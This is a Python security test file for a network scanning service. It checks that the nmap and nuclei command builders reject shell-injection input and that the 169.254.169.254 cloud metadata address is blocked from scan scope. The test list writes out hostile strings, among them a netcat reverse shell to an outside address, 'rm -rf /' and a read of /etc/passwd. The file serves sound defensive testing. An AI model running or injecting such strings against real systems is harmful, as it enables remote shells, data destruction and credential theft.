"""Security tests verifying injection defenses and SSRF prevention."""

import pytest

from app.core.exceptions import ScopeViolationError, ValidationError
from app.models.authorization import AuthorizedTarget, ScopeAuthorization, TargetType
from app.scanning.adapters.nmap.command_builder import build_nmap_command
from app.scanning.adapters.nuclei.command_builder import build_nuclei_command
from app.scanning.scope_gate import verify_scan_scope


def test_command_builder_injection_resistance():
    """Verify that command builders reject malicious characters before constructing commands."""
    malicious_inputs = [
        "127.0.0.1; whoami",
        "example.com && rm -rf /",
        "10.0.0.1 | nc -e /bin/sh 1.2.3.4 4444",
        "`cat /etc/passwd`",
        "$(touch /tmp/pwned)",
        "http://evil.com/`id`",
    ]
    for inp in malicious_inputs:
        with pytest.raises(ValidationError):
            build_nmap_command([inp], {}, "out.xml")

        with pytest.raises(ValidationError):
            build_nuclei_command([inp], {}, "out.jsonl")


def test_ssrf_cloud_metadata_blocked():
    """Verify cloud metadata endpoint 169.254.169.254 is rejected from scanning scope."""
    import uuid
    auth = ScopeAuthorization(
        organization_id=uuid.uuid4(),
        title="Valid Auth",
        signer_name="Security Admin",
        signer_email="admin@corp.internal",
        authorization_date=pytest.importorskip("datetime").date.today(),
        created_by=uuid.uuid4(),
    )
    auth.authorized_targets = [
        AuthorizedTarget(
            authorization_id=auth.id,
            target_type=TargetType.IPV4_CIDR,
            value="169.254.0.0/16",
        )
    ]
    with pytest.raises(ScopeViolationError):
        verify_scan_scope(auth, [(TargetType.IPV4, "169.254.169.254")])
